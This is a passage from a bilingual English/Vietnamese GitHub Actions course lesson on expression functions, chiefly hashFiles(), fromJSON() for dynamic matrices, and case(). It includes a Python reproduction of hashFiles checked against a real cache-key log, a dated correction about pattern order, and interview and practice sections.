<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: operators and type casting</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#operators — bảng độ ưu tiên toán tử và đúng những luật ép kiểu chép lại bên trên, gồm cả các ca NaN.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: status check functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#status-check-functions — bốn hàm trạng thái, và phát biểu rằng dùng bất kỳ cái nào cũng gỡ mất cái <code>success()</code> ngầm định.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">YAML 1.1 type resolution — lược đồ bool</span><span class="lc-sub">yaml.org/type/bool.html — cái danh sách biến <code>no</code>, <code>off</code> và <code>on</code> thành boolean. Cùng trang ấy giải thích khoá <code>on:</code> của bài 1.1, và nó giải thích mấy dòng cuối của bảng bên trên.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — == với ===, và vì sao bảng ép kiểu bị đem đi học thuộc</span><span class="lc-sub">/courses/typescript/learn${REF} — cùng một quyết định thiết kế ở một ngôn ngữ có cho bạn lối thoát; Actions không có toán tử so sánh nghiêm ngặt, nên kỷ luật phải tới từ chính bạn.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.4 ─────────────────────────── */
    {
      title: '3.4 — Functions, and hashFiles() reproduced exactly|||3.4 — Hàm, và hashFiles() tái lập KHỚP CHÍNH XÁC',
      slug: 'ga-3-4-ham',
      type: 'VIDEO',
      description: 'Tái lập `hashFiles()` bằng 6 dòng Python rồi đối chiếu với log thật của job 85355071479 — KHỚP tới từng ký tự hex. Cộng `fromJSON` để tính ma trận lúc chạy, và `format()` thay cho việc ghép chuỗi.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.4</span>
<h2>Functions, and <code>hashFiles()</code> reproduced exactly</h2>
<p class="lead">There are about a dozen built-in functions. Most are obvious. Two of them — <code>hashFiles</code> and <code>fromJSON</code> — do things you cannot do any other way, and one of them is worth verifying rather than trusting, because your cache correctness depends on it.</p>

<h3>The straightforward ones</h3>
${slide('ga-03', 21, 'The function table with real results')}

<div class="kv-grid">
<div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">substring if <code>a</code> is a string, membership if <code>a</code> is an array. <code>contains(github.event.head_commit.message, '[skip ci]')</code> is the common use — and note that a commit message is attacker-controlled text, so keep it in a condition, never in a <code>run:</code></span></div>
<div class="kv"><span class="k"><code>startsWith</code> / <code>endsWith</code></span><span class="v">the right way to ask "is this a tag" — <code>startsWith(github.ref, 'refs/tags/')</code></span></div>
<div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">positional substitution with <code>{0}</code>, <code>{1}</code>. Literal braces are doubled: <code>{{</code>. Prefer it over concatenation, which the language does not have</span></div>
<div class="kv"><span class="k"><code>join(arr, sep)</code></span><span class="v">array to string. Pairs with the <code>.*</code> operator: <code>join(github.event.commits.*.id, ', ')</code></span></div>
<div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">pretty-printed JSON. The debugging tool from 3.2 — and the thing you pass through <code>env:</code>, never into <code>run:</code></span></div>
<div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">parse. Two real uses below, and both are the only way to do what they do</span></div>
</div>

<h3>The functions, run for real</h3>
<p>Predictions are cheap; measurements are not. Every function above was run on the sandbox (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>), and a few results are worth pinning down because they surprise:</p>
<div class="out">format('{0}-{1}-{2}', 'v', 1, true)   = v-1-true      <- number, bool become text
format('{{khong thay}} {0}', 'x')      = {khong thay} x  <- literal braces doubled
format('[{0}]', null)                  = []             <- null becomes empty
join(fromJSON('[1,2,3]'), '+')         = 1+2+3
contains('Hello world', 'LLO')         = true           <- case-insensitive
contains(fromJSON('["push","pull_request"]'), 'pull')  = false  <- array: whole-element match
fromJSON('true') == 'true'             = false          <- boolean vs string
0xff                                    = 255</div>
<p><code>contains</code> on a string is a substring test; on an array it needs a whole element to match, so <code>'pull'</code> does not match <code>'pull_request'</code>. That distinction is the reason <code>contains(fromJSON('["push","pull_request"]'), github.event_name)</code> is the clean way to write "is this one of these events".</p>

<h3>case(): choose a value without the <code>&amp;&amp; ||</code> trap</h3>
${slide('ga-03', 22, 'case(): choose a value by condition, no more && || trap')}
<p>3.3 showed the ternary idiom <code>cond &amp;&amp; A || B</code> breaking when <code>A</code> is empty. GitHub now has a function built for exactly this — <code>case(pred1, val1, pred2, val2, ..., default)</code> returns the value of the first true predicate:</p>
<pre><code class="language-yaml">env:
  MOI_TRUONG: &#36;{{ case(
    github.ref_name == 'main', 'production',
    startsWith(github.ref_name, 'ch03'), 'thu-nghiem',
    'khac') }}</code></pre>
<p>Measured (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a> and 36001492952): on <code>ch03-bieu-thuc</code> it returned <code>thu-nghiem</code>; and where the ternary fails, <code>case(true, '', 'X')</code> correctly returned the empty string while <code>true &amp;&amp; '' || 'X'</code> returned <code>X</code>. actionlint 1.7.12 does not yet know the function but does not error on it, and GitHub runs it.</p>
<h3><code>hashFiles()</code> — what it computes, verified</h3>
<p>The documented algorithm is: SHA-256 each matched file, concatenate those hashes, SHA-256 the result. That is six lines to reproduce:</p>

<pre><code>def hash_files(*pats):
    fs = sorted(set(f for p in pats for f in glob(p) if isfile(f)))
    outer = sha256()
    for f in fs:
        inner = sha256(open(f,'rb').read()).hexdigest()
        outer.update(bytes.fromhex(inner))   <span class="tok-comment"># NOI DANG NHI PHAN</span>
    return outer.hexdigest()</code></pre>

<p>Reproducing it is easy; knowing whether the reproduction is <em>right</em> is the interesting part. This repository has a real run that printed a cache key built from <code>hashFiles</code>. So: compute the prediction for <code>frontend/package-lock.json</code> at that run&#39;s commit, then read the log.</p>

<div class="out">--- du doan, tinh o day tu commit d6b9378 ---
e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b

--- log that, job 85355071479 ---
Cache hit occurred on the primary key
  nextjs-cache-Linux-frontend-lock-e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b</div>

<div class="callout ok">
<p><strong>Exact match, all sixty-four hex characters.</strong> The reproduction is correct, which means three things are now known rather than assumed: the concatenation is of <em>binary</em> hashes not hex strings, the file list is <em>sorted</em>, and the algorithm has no salt or repository-specific component. That last one matters — the same file content gives the same key in any repository, which is why a cache key that contains only <code>hashFiles</code> and no OS is a key that can collide across platforms.</p>
</div>

<h3>Pattern ORDER matters — corrected, measured</h3>
${slide('ga-03', 23, 'hashFiles(): change the pattern order and the key changes')}
<div class="callout warn">
<p><strong>Correction, 24/09/2026.</strong> An earlier version said the order of patterns does not affect the hash, and printed two keys as identical. That was produced by a Python reproduction that <code>sorted()</code> the file list; GitHub does not sort across separate patterns.</p></div>
<p>Run on the sandbox (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>), two files in two orders give two different keys:</p>
<div class="out">hashFiles('ch03/a.txt', 'ch03/b.txt')  = 1f218639f46f...9518dc73
hashFiles('ch03/b.txt', 'ch03/a.txt')  = fb7d2a24f465...2a408c8   <- KHAC</div>
<p>Within a single glob the matched files are ordered consistently, so <code>hashFiles('ch03/*.txt')</code> is stable and equals the a-then-b result. But when you list patterns yourself, the order is part of the key. Keep it fixed across workflows, or two jobs that hash the same files will miss each other&#39;s cache.</p>

<div class="pitfall">
<p><strong>Trap — <code>hashFiles</code> returns an empty string when nothing matches.</strong> No error, no warning. A cache key with a typo in the glob becomes <code>my-cache-</code> — a constant, shared by every run, that never invalidates. So the cache is restored from a stale entry forever and the workflow looks fast right up until it is wrong. If a cache key ends in a dash in your logs, that is what happened.</p>
</div>

<h3><code>fromJSON()</code> — the two things it is actually for</h3>
<p><strong>First: a matrix computed at run time.</strong> A matrix must be literal YAML, which means you cannot loop over something discovered during the run — unless the matrix value is a string that <code>fromJSON</code> parses:</p>

<pre><code>jobs:
  tim:
    outputs:
      ds: &#36;{{ steps.q.outputs.ds }}
    steps:
      - id: q
        run: echo "ds=[\\"a\\",\\"b\\",\\"c\\"]" &gt;&gt; \$GITHUB_OUTPUT

  chay:
    needs: tim
    strategy:
      matrix:
        muc: &#36;{{ fromJSON(needs.tim.outputs.ds) }}</code></pre>

<p><strong>Second: getting a real type out of a string.</strong> Everything written to <code>$GITHUB_OUTPUT</code> is a string, and so is anything read through the older <code>github.event.inputs.x</code>. (Correction, 24/09/2026: an earlier version said a <code>type: boolean</code> input is always a string. It is not — the <code>inputs</code> context keeps it as a real boolean; only <code>github.event.inputs</code> stringifies it. Chapter 1 measured this on the sandbox.) So use <code>fromJSON</code> where it earns its place: turning a step output into a number or boolean, <code>fromJSON('true')</code> being the boolean <code>true</code>, or building a matrix from a JSON string. For a genuine <code>inputs</code> boolean you need nothing; for <code>github.event.inputs.x</code>, either <code>== 'true'</code> or <code>fromJSON(...)</code>.</p>

<div class="callout warn">
<p><strong><code>fromJSON</code> on a value you do not control is a parser you did not audit, running on attacker input.</strong> Feeding it a branch name, a PR body or an artifact&#39;s contents means arbitrary structure enters your expression evaluation and, through a computed matrix, arbitrary job definitions. Use it on values your own workflow produced.</p>
</div>


${slide('ga-03', 24, 'fromJSON(): a matrix and a timeout from a previous job output')}
${slide('ga-03', 25, 'Three functions need the right place: hashFiles in a step, status in if:')}
<p>The dynamic-matrix pattern above was run for real (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>): a first job wrote a JSON array and an integer to its outputs, and a second job used <code>fromJSON</code> to build both its <code>matrix</code> and its <code>timeout-minutes</code> from them. Note where <code>hashFiles</code> may and may not be used: it reads files on the runner&#39;s disk, so it lives in step-level keys only — a fact actionlint enforces, and one this lesson tripped over while being written (<code>&#36;{{ !cancelled() }}</code> in a step <code>name:</code> produced <em>"calling function cancelled is not allowed here"</em>).</p>
<h3>A cache key that is actually correct</h3>
<p>Putting 3.2 and this lesson together, the key from this repository reads exactly as it should:</p>

<pre><code>key: nextjs-cache-&#36;{{ runner.os }}-frontend-lock-&#36;{{ hashFiles('frontend/package-lock.json') }}</code></pre>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">a literal prefix</span><span class="lz-t"><code>nextjs-cache-</code></span><span class="lz-d">names what is in it, so a human reading the cache list can tell</span></div>
<div class="lz-step"><span class="lz-k">the platform</span><span class="lz-t"><code>&#36;{{ runner.os }}</code></span><span class="lz-d">expands to <code>Linux</code>, visible in the log above. Without it, a macOS job could restore a Linux cache</span></div>
<div class="lz-step"><span class="lz-k">the content hash</span><span class="lz-t"><code>hashFiles(...)</code></span><span class="lz-d">changes exactly when the dependency set changes, and not otherwise</span></div>
</div>

<div class="callout">
<p><strong>The one sentence.</strong> Functions are the only computation the expression language has, <code>hashFiles</code> is the one whose behaviour your build correctness rests on, and it is reproducible in six lines — so it can be checked rather than believed.</p>
</div>

<h3>Common interview questions</h3>
<div class="callout">
<p><strong>Q: How do you build a matrix from something discovered at run time?</strong><br>A: A job outputs a JSON array as a string; the next job sets <code>strategy: matrix: key: &#36;{{ fromJSON(needs.first.outputs.arr) }}</code>. A matrix must be literal YAML, and <code>fromJSON</code> is the only supported way to turn discovered data into one.</p>
<p><strong>Q: A cache key ends in a dash and never invalidates. Why?</strong><br>A: <code>hashFiles()</code> returned an empty string because its glob matched no files — no error, so the key became a constant like <code>cache-Linux-</code>, shared by every run. Fix the glob; a key that hashes nothing is a bug, not a cache.</p>
<p><strong>Q: When is <code>fromJSON</code> on untrusted input a problem?</strong><br>A: It parses attacker-chosen structure into your evaluation, and via a computed matrix into job definitions. Use it on values your own workflow produced; keep event text out of it.</p>
</div>

<h3>🧪 Practice (15–20 min)</h3>
<div class="callout ok"><p><strong>Scenario:</strong> your build caches <code>node_modules</code>, but the cache "never seems to update". You suspect the key.</p><ol>
<li>In a test repository, add a step that echoes <code>hashFiles('package-lock.json')</code>, then one that echoes <code>hashFiles('package-loсk.json')</code> with a deliberate typo (or a non-existent path). Compare.</li>
<li>Add two files and echo <code>hashFiles('a.txt', 'b.txt')</code> and <code>hashFiles('b.txt', 'a.txt')</code>; then <code>hashFiles('*.txt')</code>. Which two agree?</li>
<li>Reproduce one hash locally in six lines of Python (SHA-256 each file, concatenate the <em>binary</em> digests, SHA-256 the result) and confirm it matches the log.</li>
<li>Build a dynamic matrix: job A writes <code>echo 'ds=["x","y"]' &gt;&gt; "$GITHUB_OUTPUT"</code>, job B uses <code>matrix: v: &#36;{{ fromJSON(needs.a.outputs.ds) }}</code>.</li></ol>
<p><strong>Done when:</strong> the typo key ends in a bare dash; the two multi-pattern orders differ while the single glob equals the a-then-b order; your Python hash matches; and job B ran twice, once per matrix value.</p></div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>hashFiles(...)</code></span><span class="v">SHA-256 of each matched file, concatenated as binary, hashed again; empty string if nothing matches. Step-level only.</span></div>
  <div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">Parse a JSON string into a real value: array, object, number or boolean.</span></div>
  <div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">Pretty-printed JSON of a value; the debugging tool, always routed through <code>env:</code>.</span></div>
  <div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">Positional substitution with <code>{0}</code>; literal braces are doubled <code>{{ }}</code>.</span></div>
  <div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">Substring if <code>a</code> is a string, whole-element membership if an array; case-insensitive.</span></div>
  <div class="kv"><span class="k"><code>case(p, v, ..., default)</code></span><span class="v">Returns the value for the first true predicate; a safe replacement for <code>&amp;&amp; ||</code> selection.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>Functions are the only computation the expression language has; most are obvious, two are not.</li>
<li><code>hashFiles</code> hashes matched files (binary concatenation) and returns empty on no match — a key ending in a dash means the glob missed.</li>
<li>Pattern <em>order</em> across separate patterns is part of the key; a single glob is order-stable.</li>
<li><code>fromJSON</code> builds a run-time matrix and converts strings to real types; a real <code>inputs</code> boolean needs neither.</li>
<li><code>case()</code> selects a value by condition without the empty-middle trap of <code>cond &amp;&amp; A || B</code>.</li>
<li><code>hashFiles</code> and the status functions only exist in the keys where their inputs exist — a step, and <code>if:</code> respectively.</li>
</ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#functions — all built-in functions with their exact signatures, including the statement of the <code>hashFiles</code> algorithm reproduced and verified above.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/toolkit — the hashFiles implementation</span><span class="lc-sub">github.com/actions/toolkit — the runner-side source, for when the documented description leaves a question open (for example, whether the concatenation is of binary digests or hex strings; it is binary).</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Using a matrix: dynamic matrices with fromJSON</span><span class="lc-sub">docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs#using-a-matrix-from-a-job-output — the job-output-to-matrix pattern shown above, which is the only supported way to build a matrix from discovered data.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Docker — layer caching, content hashes, and what actually invalidates</span><span class="lc-sub">/courses/docker/learn${REF} — the same idea in a build system that lives or dies by it: a cache key is a claim about what a result depends on, and the bugs come from the claim being wrong rather than from the cache.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — hashing, and why the encoding of the input matters</span><span class="lc-sub">/courses/authentication/learn${REF} — hex versus binary is not a detail: hashing the same bytes two ways gives two different answers, which is exactly the question the verification above settled.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.4</span>
<h2>Hàm, và <code>hashFiles()</code> tái lập KHỚP CHÍNH XÁC</h2>
<p class="lead">Có khoảng chục hàm dựng sẵn. Phần lớn là hiển nhiên. Hai trong số đó — <code>hashFiles</code> và <code>fromJSON</code> — làm những việc không cách nào khác làm được, và một trong hai đáng được KIỂM CHỨNG thay vì tin tưởng, bởi tính đúng đắn của cache bạn dựa vào nó.</p>

<h3>Những cái thẳng thắn</h3>
${slide('ga-03', 21, 'Bảng hàm với kết quả thật')}

<div class="kv-grid">
<div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">chuỗi con nếu <code>a</code> là chuỗi, phép thuộc nếu <code>a</code> là mảng. <code>contains(github.event.head_commit.message, '[skip ci]')</code> là cách dùng phổ biến — và nhớ rằng thông điệp commit là phần chữ do kẻ tấn công kiểm soát, nên hãy giữ nó trong một điều kiện, đừng bao giờ đưa vào <code>run:</code></span></div>
<div class="kv"><span class="k"><code>startsWith</code> / <code>endsWith</code></span><span class="v">cách đúng để hỏi "đây có phải một tag không" — <code>startsWith(github.ref, 'refs/tags/')</code></span></div>
<div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">thay theo vị trí với <code>{0}</code>, <code>{1}</code>. Ngoặc nhọn viết thật thì gấp đôi: <code>{{</code>. Ưu tiên nó hơn phép ghép chuỗi, thứ mà ngôn ngữ này KHÔNG có</span></div>
<div class="kv"><span class="k"><code>join(mang, dau)</code></span><span class="v">mảng thành chuỗi. Đi cặp với toán tử <code>.*</code>: <code>join(github.event.commits.*.id, ', ')</code></span></div>
<div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">JSON in đẹp. Công cụ gỡ lỗi ở bài 3.2 — và là thứ bạn truyền qua <code>env:</code>, không bao giờ đổ vào <code>run:</code></span></div>
<div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">phân tích cú pháp. Hai cách dùng thật ở dưới, và cả hai là cách DUY NHẤT làm được điều chúng làm</span></div>
</div>

<h3>Các hàm, chạy thật</h3>
<p>Đoán thì rẻ; đo thì không. Mọi hàm bên trên đã chạy trên sân tập (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>), và vài kết quả đáng ghim vì chúng gây bất ngờ:</p>
<div class="out">format('{0}-{1}-{2}', 'v', 1, true)   = v-1-true      <- số, boolean thành chữ
format('{{khong thay}} {0}', 'x')      = {khong thay} x  <- ngoặc nhọn thật gấp đôi
format('[{0}]', null)                  = []             <- null thành rỗng
join(fromJSON('[1,2,3]'), '+')         = 1+2+3
contains('Hello world', 'LLO')         = true           <- không phân biệt hoa/thường
contains(fromJSON('["push","pull_request"]'), 'pull')  = false  <- mảng: khớp NGUYÊN phần tử
fromJSON('true') == 'true'             = false          <- boolean khác chuỗi
0xff                                    = 255</div>
<p><code>contains</code> trên chuỗi là phép tìm chuỗi con; trên mảng nó cần một phần tử BẰNG nguyên, nên <code>'pull'</code> không khớp <code>'pull_request'</code>. Chỗ phân biệt ấy là lý do <code>contains(fromJSON('["push","pull_request"]'), github.event_name)</code> là cách gọn để viết "đây có phải một trong các sự kiện này".</p>

<h3>case(): chọn giá trị mà không dính bẫy <code>&amp;&amp; ||</code></h3>
${slide('ga-03', 22, 'case(): chọn giá trị theo điều kiện, không còn bẫy && ||')}
<p>Bài 3.3 cho thấy lối ba ngôi <code>cond &amp;&amp; A || B</code> vỡ khi <code>A</code> rỗng. GitHub giờ có một hàm dựng đúng cho việc này — <code>case(đk1, gt1, đk2, gt2, ..., mặc_định)</code> trả giá trị của điều kiện đúng đầu tiên:</p>
<pre><code class="language-yaml">env:
  MOI_TRUONG: &#36;{{ case(
    github.ref_name == 'main', 'production',
    startsWith(github.ref_name, 'ch03'), 'thu-nghiem',
    'khac') }}</code></pre>
<p>Đo thật (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a> và 36001492952): trên <code>ch03-bieu-thuc</code> nó trả <code>thu-nghiem</code>; và ở chỗ lối ba ngôi vỡ, <code>case(true, '', 'X')</code> trả đúng chuỗi rỗng còn <code>true &amp;&amp; '' || 'X'</code> trả <code>X</code>. actionlint 1.7.12 chưa biết hàm này nhưng không báo lỗi, và GitHub chạy nó.</p>
<h3><code>hashFiles()</code> — nó tính cái gì, đã kiểm chứng</h3>
<p>Thuật toán trong tài liệu là: SHA-256 từng file khớp mẫu, nối các hash ấy lại, rồi SHA-256 kết quả. Chỉ sáu dòng để tái lập:</p>

<pre><code>def hash_files(*pats):
    fs = sorted(set(f for p in pats for f in glob(p) if isfile(f)))
    outer = sha256()
    for f in fs:
        inner = sha256(open(f,'rb').read()).hexdigest()
        outer.update(bytes.fromhex(inner))   <span class="tok-comment"># NOI DANG NHI PHAN</span>
    return outer.hexdigest()</code></pre>

<p>Tái lập thì dễ; biết được bản tái lập có <em>ĐÚNG</em> hay không mới là phần thú vị. Kho này có một lần chạy thật đã in ra một khoá cache dựng từ <code>hashFiles</code>. Vậy thì: tính dự đoán cho <code>frontend/package-lock.json</code> tại commit của lần chạy ấy, rồi đọc log.</p>

<div class="out">--- du doan, tinh o day tu commit d6b9378 ---
e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b

--- log that, job 85355071479 ---
Cache hit occurred on the primary key
  nextjs-cache-Linux-frontend-lock-e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b</div>

<div class="callout ok">
<p><strong>Khớp chính xác, cả sáu mươi tư ký tự hex.</strong> Bản tái lập đúng, nghĩa là ba điều giờ đã BIẾT chứ không còn là phỏng đoán: phép nối là nối các hash dạng <em>NHỊ PHÂN</em> chứ không phải chuỗi hex, danh sách file được <em>SẮP XẾP</em>, và thuật toán KHÔNG có muối hay thành phần riêng theo kho. Cái cuối có nghĩa — cùng nội dung file cho cùng một khoá ở BẤT KỲ kho nào, và đó là lý do một khoá cache chỉ chứa <code>hashFiles</code> mà không chứa hệ điều hành là một khoá VA CHẠM ĐƯỢC giữa các nền tảng.</p>
</div>

<h3>THỨ TỰ mẫu có ý nghĩa — đã sửa, đo thật</h3>
${slide('ga-03', 23, 'hashFiles(): đổi thứ tự mẫu thì khoá đổi')}
<div class="callout warn">
<p><strong>Đính chính, 24/09/2026.</strong> Bản trước nói thứ tự các mẫu không ảnh hưởng tới hash, và in hai khoá là giống nhau. Đó là kết quả của một bản tái lập Python có <code>sorted()</code> danh sách file; GitHub KHÔNG sắp xếp khi các mẫu tách rời.</p></div>
<p>Chạy trên sân tập (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179987" target="_blank" rel="noopener">run 36000179987</a>), hai file theo hai thứ tự cho hai khoá khác nhau:</p>
<div class="out">hashFiles('ch03/a.txt', 'ch03/b.txt')  = 1f218639f46f...9518dc73
hashFiles('ch03/b.txt', 'ch03/a.txt')  = fb7d2a24f465...2a408c8   <- KHAC</div>
<p>Trong MỘT glob thì các file khớp được xếp thứ tự nhất quán, nên <code>hashFiles('ch03/*.txt')</code> ổn định và bằng kết quả a-rồi-b. Nhưng khi bạn tự liệt kê nhiều mẫu, thứ tự là một phần của khoá. Giữ nó cố định giữa các workflow, không thì hai job băm cùng bộ file sẽ trượt cache của nhau.</p>

<div class="pitfall">
<p><strong>Bẫy — <code>hashFiles</code> trả về CHUỖI RỖNG khi không có gì khớp.</strong> Không lỗi, không cảnh báo. Một khoá cache có mẫu glob gõ sai sẽ thành <code>my-cache-</code> — một hằng số, dùng chung cho mọi lần chạy, không bao giờ hết hiệu lực. Nên cache cứ được phục hồi từ một mục cũ mãi mãi và workflow trông nhanh cho tới đúng lúc nó SAI. Nếu một khoá cache trong log của bạn kết thúc bằng một dấu gạch ngang, thì chuyện đó vừa xảy ra.</p>
</div>

<h3><code>fromJSON()</code> — hai việc nó thật sự dùng để làm</h3>
<p><strong>Một: một ma trận TÍNH RA LÚC CHẠY.</strong> Một ma trận phải là YAML viết sẵn, nghĩa là bạn không lặp được trên thứ gì khám phá ra trong lúc chạy — trừ khi giá trị ma trận là một chuỗi mà <code>fromJSON</code> phân tích ra:</p>

<pre><code>jobs:
  tim:
    outputs:
      ds: &#36;{{ steps.q.outputs.ds }}
    steps:
      - id: q
        run: echo "ds=[\\"a\\",\\"b\\",\\"c\\"]" &gt;&gt; \$GITHUB_OUTPUT

  chay:
    needs: tim
    strategy:
      matrix:
        muc: &#36;{{ fromJSON(needs.tim.outputs.ds) }}</code></pre>

<p><strong>Hai: lấy một KIỂU THẬT ra từ một chuỗi.</strong> Mọi thứ ghi vào <code>$GITHUB_OUTPUT</code> đều là chuỗi, và thứ đọc qua <code>github.event.inputs.x</code> cũ cũng vậy. (Đính chính 24/09/2026: bản trước nói một tham số <code>type: boolean</code> luôn là chuỗi. Không phải — context <code>inputs</code> giữ nó là boolean thật; chỉ <code>github.event.inputs</code> mới biến thành chuỗi. Chương 1 đã đo trên sân tập.) Nên dùng <code>fromJSON</code> đúng chỗ nó đáng: biến output của bước thành số hay boolean, <code>fromJSON('true')</code> là boolean <code>true</code>, hoặc dựng ma trận từ một chuỗi JSON. Boolean thật trong <code>inputs</code> thì không cần gì; với <code>github.event.inputs.x</code> thì hoặc <code>== 'true'</code> hoặc <code>fromJSON(...)</code>.</p>

<div class="callout warn">
<p><strong><code>fromJSON</code> trên một giá trị bạn không kiểm soát là một bộ phân tích bạn chưa soát, chạy trên dữ liệu của kẻ tấn công.</strong> Cho nó ăn một tên nhánh, một thân PR hay nội dung một artifact nghĩa là cấu trúc tuỳ ý đi vào quá trình tính biểu thức của bạn và, qua một ma trận tính lúc chạy, đi vào những định nghĩa job tuỳ ý. Hãy dùng nó trên những giá trị chính workflow của bạn sinh ra.</p>
</div>


${slide('ga-03', 24, 'fromJSON(): ma trận và timeout tính từ output của job trước')}
${slide('ga-03', 25, 'Ba hàm cần đúng chỗ: hashFiles ở bước, trạng thái ở if:')}
<p>Khuôn ma-trận-động bên trên đã chạy thật (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>): một job đầu ghi một mảng JSON và một số nguyên vào output, một job sau dùng <code>fromJSON</code> để dựng cả <code>matrix</code> lẫn <code>timeout-minutes</code> từ chúng. Để ý <code>hashFiles</code> dùng được ở đâu và không dùng được ở đâu: nó đọc tệp trên đĩa runner, nên chỉ sống trong các khoá mức bước — một sự thật actionlint bắt buộc, và cũng là chỗ bài này vấp phải lúc soạn (<code>&#36;{{ !cancelled() }}</code> trong <code>name:</code> của bước cho ra <em>"calling function cancelled is not allowed here"</em>).</p>
<h3>Một khoá cache thật sự đúng</h3>
<p>Ghép bài 3.2 với bài này, cái khoá của kho này đọc lên đúng như nó phải thế:</p>

<pre><code>key: nextjs-cache-&#36;{{ runner.os }}-frontend-lock-&#36;{{ hashFiles('frontend/package-lock.json') }}</code></pre>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">một tiền tố viết thật</span><span class="lz-t"><code>nextjs-cache-</code></span><span class="lz-d">gọi tên thứ nằm trong đó, để một con người đọc danh sách cache còn biết được</span></div>
<div class="lz-step"><span class="lz-k">nền tảng</span><span class="lz-t"><code>&#36;{{ runner.os }}</code></span><span class="lz-d">nở ra thành <code>Linux</code>, nhìn thấy được trong log bên trên. Thiếu nó thì một job macOS có thể phục hồi một cache của Linux</span></div>
<div class="lz-step"><span class="lz-k">hash nội dung</span><span class="lz-t"><code>hashFiles(...)</code></span><span class="lz-d">đổi đúng khi tập phụ thuộc đổi, và không đổi vào lúc nào khác</span></div>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Hàm là phép tính DUY NHẤT mà ngôn ngữ biểu thức có, <code>hashFiles</code> là cái mà tính đúng đắn bản dựng của bạn dựa lên, và nó tái lập được trong sáu dòng — nên nó KIỂM được thay vì phải TIN.</p>
</div>

<h3>Câu hỏi phỏng vấn hay gặp</h3>
<div class="callout">
<p><strong>H: Dựng một ma trận từ thứ khám phá ra lúc chạy thế nào?</strong><br>Đ: Một job xuất một mảng JSON dưới dạng chuỗi; job sau đặt <code>strategy: matrix: key: &#36;{{ fromJSON(needs.first.outputs.arr) }}</code>. Ma trận phải là YAML viết sẵn, và <code>fromJSON</code> là cách DUY NHẤT được hỗ trợ để biến dữ liệu khám phá thành ma trận.</p>
<p><strong>H: Một khoá cache kết thúc bằng dấu gạch và không bao giờ hết hiệu lực. Vì sao?</strong><br>Đ: <code>hashFiles()</code> trả chuỗi rỗng vì glob của nó không khớp file nào — không lỗi, nên khoá thành một hằng kiểu <code>cache-Linux-</code>, dùng chung mọi run. Sửa glob; một khoá băm không-gì là lỗi, không phải cache.</p>
<p><strong>H: Khi nào <code>fromJSON</code> trên dữ liệu người ngoài là nguy hiểm?</strong><br>Đ: Nó phân tích cấu trúc do kẻ tấn công chọn vào quá trình tính của bạn, và qua một ma trận tính được, vào các định nghĩa job. Hãy dùng trên giá trị chính workflow của bạn sinh ra; giữ chữ của sự kiện ra ngoài.</p>
</div>

<h3>🧪 Thực hành (15–20 phút)</h3>
<div class="callout ok"><p><strong>Tình huống:</strong> bản dựng của bạn cache <code>node_modules</code>, nhưng cache "không bao giờ cập nhật". Bạn nghi cái khoá.</p><ol>
